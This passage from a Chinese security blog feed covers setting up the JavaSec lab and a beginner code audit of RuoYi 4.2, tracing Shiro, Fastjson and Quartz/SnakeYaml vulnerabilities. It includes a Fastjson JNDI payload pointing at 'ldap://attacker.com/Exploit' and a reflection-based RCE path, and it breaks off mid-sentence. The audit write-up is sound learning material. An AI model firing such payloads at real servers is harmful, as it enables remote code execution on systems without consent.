        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>下载</h1><p><a href="https://github.com/bewhale/JavaSec">github-下载地址</a>记得下载zip和releases中的jar包共两个文件</p><h1>配置</h1><blockquote><p>这里是原有的部署方法, 本人在不属实发现该方法不生效, 但还是写一下</p></blockquote><p>更改application.yml文件的数据库账号信息, 改成你的数据库<code>JavaSec-master\src\main\resources\application.yml</code></p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/javasec?serverTimezone=Asia/Shanghai&amp;useSSL=false&amp;allowPublicKeyRetrieval=true</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">your_passwd</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">  <span class="attr">thymeleaf:</span></span><br><span class="line">    <span class="attr">cache:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>新建javasec数据库(Navicat工具管理的mysql), 然后导入目录下的javasec.sql即可, 这样就算配置完了</p><p>到下载的jar包目录下, 用命令行运行</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">java <span class="literal">-jar</span> javasec<span class="literal">-0</span>.<span class="number">0.1</span><span class="literal">-SNAPSHOT</span>.jar</span><br></pre></td></tr></table></figure><p>在浏览器中打开<code>127.0.0.1:8000</code>即可进入登录界面, “Java漏洞靶场”, 默认账户<code>admin / admin</code></p><h1>问题</h1><p>README中没写, 网上文章推荐docker, 我就不</p><h2 id="描述"><a class="header-anchor" href="#描述">¶</a>描述</h2><p>在配置完后访问<code>127.0.0.1:8000</code>, 你会发现有登录界面但是没法登录, 报错提示为数据库连接错误</p><p>经过尝试后发现是配置文件没有被加载, 用的是jar包内的配置文件; 验证方法也很简单, 修改<code>JavaSec-master\src\main\resources\application.yml</code>中的端口, 如8005:</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8005</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">session:</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="string">6h</span></span><br><span class="line">    <span class="attr">encoding:</span></span><br><span class="line">      <span class="attr">charset:</span> <span class="string">utf-8</span></span><br><span class="line">      <span class="attr">force:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">error:</span></span><br><span class="line">    <span class="comment">#    include-exception: true</span></span><br><span class="line">    <span class="attr">include-stacktrace:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure><p>再次运行jar包, 当看到端口仍为8000就知道就是该问题</p><h2 id="解决方式"><a class="header-anchor" href="#解决方式">¶</a>解决方式</h2><p>很简单, 把配置文件拿出来让它加载即可, 我的文件路径如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JavaSec-app\</span><br><span class="line">├── javasec-0.0.1-SNAPSHOT.jar</span><br><span class="line">└── config\</span><br><span class="line">    └── application.yml</span><br></pre></td></tr></table></figure><p>此时运行jar, 发现端口变为8005, 且能正常登录</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SnakeYaml反序列化</title>
      <link href="/article/snakeyaml-unser/"/>
      <url>/article/snakeyaml-unser/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://changeyourway.github.io/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">github-漏洞篇 - SnakeYaml 反序列化</a></li><li><a href="https://xz.aliyun.com/news/12229">先知社区-Java安全之SnakeYaml漏洞分析与利用</a></li></ol><p>SnakeYaml在Java中用于解析YAML格式, SnakeYaml几乎全版本都可被反序列化漏洞利用</p><p>SnakeYaml支持反序列化Java对象，所以当 <code>Yaml.load()</code> 函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞</p><p>代码审计关键字: <code>Yaml.load()</code></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RuoYi-4.2代码审计</title>
      <link href="/article/ruoyi4.2/"/>
      <url>/article/ruoyi4.2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>代码审计入门promax</p><p>参考文章</p><ol><li><a href="https://blog.csdn.net/2301_79545986/article/details/150265995">csdn-ruoyi若依4.6.0SQL注入代码审计（小白向 部署+源码审计）</a></li><li><a href="https://doc.ruoyi.vip/ruoyi/document/hjbs.html#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">ruoyi-环境部署</a></li><li><a href="RuoYi%204.2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B.pdf">pdf-RuoYi 4.2代码审计案例</a></li><li><a href="https://xz.aliyun.com/news/11374">先知社区-【代码审计】若依后台管理系统</a></li><li><a href="https://b1ue.cn/archives/239.html">Java 反序列化漏洞始末（5）— XML/YAML</a></li><li><a href="https://xz.aliyun.com/news/15463">先知社区-若依cms代码审计+不同版本漏洞复现</a></li><li><a href="https://forum.butian.net/share/4328">奇安信攻防社区-若依(RuoYi)框架漏洞战争手册</a></li><li><a href="https://blog.51cto.com/u_9652359/13077192">代码审计学习-若依框架</a></li><li>还有doc文件夹中的若依环境使用手册</li></ol><h1>环境搭建</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ruoyi：4.2 </span><br><span class="line">MYSQL: 8.0.32 MySQL Community Server </span><br><span class="line">JDK: jdk-8u161-windows--64 （⼀定不要使⽤⾼版本jdk不然利⽤链⽆法利⽤） MAVEN: apache-maven-3.2.3-bin</span><br></pre></td></tr></table></figure><p>jdk要手动配置是真的</p><p><strong>安装依赖</strong>右键pom.xml选择maven选择生成源代码并更新文件夹,更新完成后选择同步项目</p><p><strong>配置数据库</strong>开启你的mysql数据库并创建名为ry的数据库, 在该库中执行sql文件夹内的<code>quartz.sql</code>和<code>ry_20200323.sql</code></p><p>修改<code>ruoyi-admin/src/main/resources/application-druid.yml</code>第10行和第11行数据库账密, 或者你直接在数据库中新增也行</p><p><strong>启动服务器</strong>启动<code>ruoyi-admin/src/main/java/com/ruoyi/RuoYiApplication.java</code>, 出现该文件内的内容即可确认正常启动</p><p>现在开始你的代码审计</p><h1>前置知识</h1><p><a href="../../../%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%89%8D%E7%BD%AE.md">代码审计前置</a></p><h1>代码审计</h1><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>我说信息收集是安全的底层逻辑</p><p>存在pom.xml可以对内容进行审计, 如果用的是IDEA, 有一个易受攻击的依赖项, 你可以看哪些有漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java 1.8</span><br><span class="line">shiro 1.4.2 - 存在</span><br><span class="line">thymeleaf 2.0.0 - 存在</span><br><span class="line">mybatis 1.3.2</span><br><span class="line">druid 1.1.14</span><br><span class="line">bitwalker 1.19</span><br><span class="line">kaptcha 2.3.2</span><br><span class="line">swagger 2.9.2</span><br><span class="line">pagehelper 1.2.5</span><br><span class="line">fastjson 1.2.60 - 存在</span><br><span class="line">oshi 3.9.1</span><br><span class="line">commons.io 2.5 - 存在</span><br><span class="line">commons.fileupload 1.3.3</span><br><span class="line">poi 3.17 - 存在</span><br><span class="line">velocity 1.7 - 存在</span><br><span class="line">snakeyaml - 存在</span><br><span class="line"></span><br><span class="line">SpringBoot 2.1.1.RELEASE</span><br></pre></td></tr></table></figure><p>也可以从README中获取信息, 搭好网站登陆进去就能看到了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">核心框架：Spring Boot。</span><br><span class="line">安全框架：Apache Shiro。</span><br><span class="line">模板引擎：Thymeleaf。</span><br><span class="line">持久层框架：MyBatis。</span><br><span class="line">定时任务: Quartz。</span><br><span class="line">数据库连接池：Druid。</span><br><span class="line">工具类：Fastjson。</span><br><span class="line">更多:...</span><br></pre></td></tr></table></figure><h2 id="通读全文"><a class="header-anchor" href="#通读全文">¶</a>通读全文</h2><p>不要问通读全文, 我没那个能力</p><p><code>ruoyi-admin\src\main\java\com\ruoyi\web\controller\</code>控制层</p><p><code>ruoyi-system\src\main\java\com\ruoyi\system\</code>领域模型层</p><h2 id="手工"><a class="header-anchor" href="#手工">¶</a>手工</h2><p>真干起来肯定是用工具直接干, 然后看工具有无误报; 练习就从头开始</p><p>不借助工具那就是: 组件漏洞-&gt;关键词审计-&gt;从路由整过去</p><p>比较快的方式是利用从<code>pom.xml</code>中获取的信息, 先对组件进行审计</p><p>那就从最简单的shiro开始吧</p><h3 id="组件漏洞"><a class="header-anchor" href="#组件漏洞">¶</a>组件漏洞</h3><h4 id="shiro"><a class="header-anchor" href="#shiro">¶</a>shiro</h4><p>关键词<code>setCipherKey</code>或<code>CookieRememberMeManager</code></p><p><code>RuoYi-v4.2\ruoyi-framework\src\main\java\com\ruoyi\framework\config\ShiroConfig.java</code>该文件中第331行出现了硬编码密钥</p><blockquote><p>如果有环境, 那可以用工具打来试试; 如果没有, 那就只能单纯审计代码</p></blockquote><p>不过组件漏洞一般会有那种漏洞复现里面带着代码分析, 比如说这个:<a href="https://www.freebuf.com/articles/web/252539.html">freebuf-Shiro组件漏洞与攻击链分析</a></p><h4 id="Thymeleaf"><a class="header-anchor" href="#Thymeleaf">¶</a>Thymeleaf</h4><p>不知道就去找找呗, 比如说这个<a href="https://blog.csdn.net/m0_71692682/article/details/130538310">csdn-Thymeleaf模板注入漏洞总结及修复方法（上篇）</a></p><p>由于使用了这个模板引擎, 所以部分前置知识需要知晓<a href="../../java/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.md">Thymeleaf模板注入</a>, 寻找漏洞便容易许多</p><p>结合上面的知识, 没有找到利用点, 若依v4.7.1据说存在, 以后看看</p><h4 id="fastjson"><a class="header-anchor" href="#fastjson">¶</a>fastjson</h4><p>Fastjson &lt;= 1.2.68 RCE</p><p>找<code>parseObject</code>关键词, 文中仅有<code>JSONObject.parseObject</code>方法</p><p>当你调用 <code>JSONObject.parseObject(result)</code> 时，实际上是调用了 <code>JSON</code> 类中的 <code>parseObject(String text)</code> 方法, 同样可以触发反序列化</p><blockquote><p><code>JSONObject</code> 是 <code>JSON</code> 类的子类或它的一部分，所以它会直接继承或使用父类的方法</p></blockquote><p>此处存在的两个java路径:</p><ul><li><code>RuoYi-v4.2\ruoyi-generator\src\main\java\com\ruoyi\generator\util\VelocityUtils.java</code></li><li><code>RuoYi-v4.2\ruoyi-generator\src\main\java\com\ruoyi\generator\service\impl\GenTableServiceImpl.java</code></li></ul><p><code>VelocityUtils.java</code>中, 代码和思路如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setTreeVelocityContext</span><span class="params">(VelocityContext context, GenTable genTable)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">options</span> <span class="operator">=</span> genTable.getOptions();  </span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">paramsObj</span> <span class="operator">=</span> JSONObject.parseObject(options);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>存在参数options -&gt; 追溯参数<ul><li>ctrl单击获取到函数 <code>genTable.getOptions()</code> 追溯该函数 <code>return options;</code></li></ul></li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 其它生成选项 */</span>  </span><br><span class="line"><span class="keyword">private</span> String options;</span><br></pre></td></tr></table></figure><p>看来没有收获, 仅知道了是用于 其它生成选项 的字段, 那我们转头去寻找功能点的调用</p><ol start="2"><li>位于函数<code>setTreeVelocityContext()</code> -&gt; 追溯函数<ul><li>右键查找用法获取到函数<code>prepareContext()</code></li></ul></li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置模板变量信息</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 模板列表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> VelocityContext <span class="title function_">prepareContext</span><span class="params">(GenTable genTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (GenConstants.TPL_TREE.equals(tplCategory))</span><br><span class="line">    &#123;</span><br><span class="line">        setTreeVelocityContext(velocityContext, genTable);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> velocityContext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进常量<code>TPL_TREE</code>和参数<code>tplCategory</code>, 得知值<code>TPL_TREE</code>为tree, <code>tplCategory</code>注释为 使用的模板（crud单表操作 tree树表操作）, 结合代码, 当tplCategory值为tree的时候才会触发该方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tplCategory = &#x27;tree&#x27;; -&gt; 调用setTreeVelocityContext()</span><br></pre></td></tr></table></figure><p>回到<code>prepareContext()</code>, <code>GenTaleServiceImpl.java</code>中第187行和250行都有所调用, 先看187行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">previewCode</span><span class="params">(Long tableId)</span></span><br><span class="line">&#123;</span><br><span class="line">    Map&lt;String, String&gt; dataMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 查询表信息</span></span><br><span class="line">    <span class="type">GenTable</span> <span class="variable">table</span> <span class="operator">=</span> genTableMapper.selectGenTableById(tableId);</span><br><span class="line">    <span class="comment">// 查询列信息</span></span><br><span class="line">    List&lt;GenTableColumn&gt; columns = table.getColumns();</span><br><span class="line">    setPkColumn(table, columns);</span><br><span class="line">    VelocityInitializer.initVelocity();</span><br><span class="line"></span><br><span class="line">    <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> VelocityUtils.prepareContext(table);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>table由<code>genTableMapper.selectGenTableById(tableId)</code>控制, 我们只能操控 tableId 参数</p><p>因为该参数在函数的形参中, 我们可以直接追溯函数<code>previewCode()</code></p><blockquote><p>如果对前面的函数感兴趣可以放鼠标上去, 应该会弹出注释</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 预览代码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;tool:gen:preview&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/preview/&#123;tableId&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">preview</span><span class="params">(<span class="meta">@PathVariable(&quot;tableId&quot;)</span> Long tableId)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Map&lt;String, String&gt; dataMap = genTableService.previewCode(tableId);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.success(dataMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>输入是简单类型（Long）且来自 URL 路径</li><li>攻击者无法注入恶意 JSON 负载</li></ul><p>这条路算是走不通了; 我说代码审计就是这样的, 走了半天发现前面是一条死路, 王朝了</p><p>没事, 这里一共就两个触发点, 不是那种一大坨的</p><p>来看看<code>GenTableServiceImpl.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改保存参数校验</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> genTable 业务信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">validateEdit</span><span class="params">(GenTable genTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (GenConstants.TPL_TREE.equals(genTable.getTplCategory()))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">options</span> <span class="operator">=</span> JSON.toJSONString(genTable.getParams());</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">paramsObj</span> <span class="operator">=</span> JSONObject.parseObject(options);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>options -&gt; <code>JSON.toJSONString(genTable.getParams());</code> -&gt; genTable</p><p>说明是这个函数的形参, 直接追踪函数调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改保存代码生成业务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;tool:gen:edit&quot;)</span></span><br><span class="line"><span class="meta">@Log(title = &quot;代码生成&quot;, businessType = BusinessType.UPDATE)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/edit&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">editSave</span><span class="params">(<span class="meta">@Validated</span> GenTable genTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    genTableService.validateEdit(genTable);</span><br><span class="line">    genTableService.updateGenTable(genTable);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.success();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用 <code>@PostMapping</code>，接收POST请求</li><li>参数 <code>GenTable genTable</code> 通过 <code>@Validated</code> 注解，Spring会自动将请求体中的JSON数据反序列化为GenTable对象</li><li><code>validateEdit()</code>首先将参数转换为JSON字符串, 随后进行Fastjson反序列化</li></ul><p>看回参考文章发现这里漏了<code>validateEdit()</code>函数的<code>genTable.getParams()</code>的分析,跟进发现直接返回一个<code>new HashMap&lt;&gt;()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getParams</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (params == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在跟进params, 发现定义为<code>Map&lt;String, Object&gt;</code>, 可以理解为params字段中可以传任何类型的值在里面, 所以传入可以是恶意的字符串而不像第一条链一样只能是Long</p><p>尝试验证一下吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /tool/gen/edit HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;tplCategory&quot;: &quot;tree&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap://attacker.com/Exploit&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SnakeYaml"><a class="header-anchor" href="#SnakeYaml">¶</a>SnakeYaml</h4><p>我直接找到了SnakeYaml和定时任务功能存在RCE, 正好之前是从关键函数倒头寻找实现再到路由, 现在从路由一路往下找关键函数</p><p>定时任务在ruoyi-quartz下, 先了解一下如何正向分析</p><p>流程: 控制层-&gt;服务层</p><p>首先关注控制层(controller), 它与前台交互并传输参数到服务(Service)层</p><p>ruoyi-quartz仅有两个控制的类, 根据注释描述, <code>SysJobLogController</code>是调度日志操作处理的类, 所以我们不需要再管, 去看<code>SysJobLogController</code>这个调度任务信息操作处理的类</p><p>结合功能, RCE需要被执行, 寻找到注释为&quot;任务调度立即执行一次&quot;的<code>run()</code>函数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 任务调度立即执行一次</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.UPDATE)</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;monitor:job:changeStatus&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/run&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">run</span><span class="params">(SysJob job)</span> <span class="keyword">throws</span> SchedulerException</span><br><span class="line">&#123;</span><br><span class="line">    jobService.run(job);</span><br><span class="line">    <span class="keyword">return</span> success();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>追踪函数里面的<code>jobService.run()</code>, 发现有一个实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 立即运行任务  </span></span><br><span class="line"><span class="comment"> *   </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> job 调度信息  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="meta">@Transactional</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(SysJob job)</span> <span class="keyword">throws</span> SchedulerException  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">Long</span> <span class="variable">jobId</span> <span class="operator">=</span> job.getJobId();  </span><br><span class="line">    <span class="type">SysJob</span> <span class="variable">tmpObj</span> <span class="operator">=</span> selectJobById(job.getJobId());  </span><br><span class="line">    <span class="comment">// 参数  </span></span><br><span class="line">    <span class="type">JobDataMap</span> <span class="variable">dataMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JobDataMap</span>();  </span><br><span class="line">    dataMap.put(ScheduleConstants.TASK_PROPERTIES, tmpObj);  </span><br><span class="line">    scheduler.triggerJob(ScheduleUtils.getJobKey(jobId, tmpObj.getJobGroup()), dataMap);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过调度任务ID查询调度信息, 可以跟进SysJob看看定时任务调度表的定义</p><p>然后实例化<code>JobDataMap</code>, 继承自<code>org.quartz.utils.StringKeyDirtyFlagMap</code>, 查看发现大概就是将信息(键值对)保存在里面</p><p>所以这个函数只是告诉Quartz调度器立即执行该任务; Quartz框架罪大恶极, 所以真正的执行不在这里</p><p>现在寻找Quartz执行器, 可以用关键词搜索:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QuartzJob</span><br><span class="line">class QuartzJob</span><br><span class="line">implements Job</span><br><span class="line">extends Job</span><br></pre></td></tr></table></figure><p><code>QuartzJob</code>直接找到文件<code>QuartzJobExecution.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定时任务处理（允许并发执行）</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ruoyi</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuartzJobExecution</span> <span class="keyword">extends</span> <span class="title class_">AbstractQuartzJob</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doExecute</span><span class="params">(JobExecutionContext context, SysJob sysJob)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        JobInvokeUtil.invokeMethod(sysJob);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>JobInvokeUtil.invokeMethod()</code>, 发现该类解析并执行我们传入的数据, 反射调用相关的类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行方法</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sysJob 系统任务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeMethod</span><span class="params">(SysJob sysJob)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">invokeTarget</span> <span class="operator">=</span> sysJob.getInvokeTarget();</span><br><span class="line">    <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> getBeanName(invokeTarget);    <span class="comment">// 传入的类名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> getMethodName(invokeTarget);    <span class="comment">// 方法名</span></span><br><span class="line">    List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);    <span class="comment">// 参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!isValidClassName(beanName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> SpringUtils.getBean(beanName);</span><br><span class="line">        invokeMethod(bean, methodName, methodParams);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> Class.forName(beanName).newInstance();</span><br><span class="line">        invokeMethod(bean, methodName, methodParams);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用的<code>invokeMethod()</code>函数如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用任务方法</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bean 目标对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName 方法名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodParams 方法参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeMethod</span><span class="params">(Object bean, String methodName, List&lt;Object[]&gt; methodParams)</span></span><br><span class="line">        <span class="keyword">throws</span> NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException,</span><br><span class="line">        InvocationTargetException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotNull(methodParams) &amp;&amp; methodParams.size() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));</span><br><span class="line">        method.invoke(bean, getMethodParamsValue(methodParams));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> bean.getClass().getDeclaredMethod(methodName);</span><br><span class="line">        method.invoke(bean);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[+]我们传入的是<code>java.lang.xxx.func('aaa')</code></p><ul><li><code>beanName = &quot;java.lang.xxx&quot;</code></li><li><code>methodName = &quot;func&quot;</code></li><li><code>methodParams = &quot;aaa&quot;</code></li></ul><p>最终执行的反射代码为：<code>Class.forName(&quot;java.lang.xxx&quot;).getDeclaredMethod(&quot;func&quot;, String.class).invoke(Class.forName(&quot;java.lang.xxx&quot;).newInstance(), &quot;aaa&quot;)</code></p><p>那么下面就是传入一个能够执行命令的类方法, <code>org.yaml.snakeyaml.Yaml</code>就满足这些条件, 